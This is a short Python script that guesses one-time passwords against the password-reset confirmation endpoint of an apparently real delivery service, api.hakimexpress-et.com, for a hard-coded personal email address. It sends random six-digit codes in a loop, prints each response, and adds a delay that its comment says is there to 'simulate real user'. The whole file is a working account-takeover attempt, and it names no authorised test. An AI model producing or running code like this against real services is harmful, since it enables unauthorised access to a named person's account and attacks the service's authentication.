import requests
import random
import string
import time

URL = "https://api.hakimexpress-et.com/api/auth/confirm-reset-request"

HEADERS = {
    "Accept": "application/json",
    "Content-Type": "application/json",
}

EMAIL = "tolossamuel1@gmail.com"
PHONE = ""

def generate_otp(length=6):
    return "".join(random.choices(string.digits, k=length))

for attempt in range(1, 11):
    otp = generate_otp()

    payload = {
        "email": EMAIL,
        "phone": PHONE,
        "otp": otp
    }

    response = requests.post(URL, json=payload, headers=HEADERS)

    print(f"Attempt {attempt}")
    print(f"OTP Sent: {otp}")
    print(f"Status Code: {response.status_code}")

    try:
        print("Response:", response.json())
    except Exception:
        print("Response:", response.text)

    print("-" * 40)

    # small delay to simulate real user
    time.sleep(0.5)
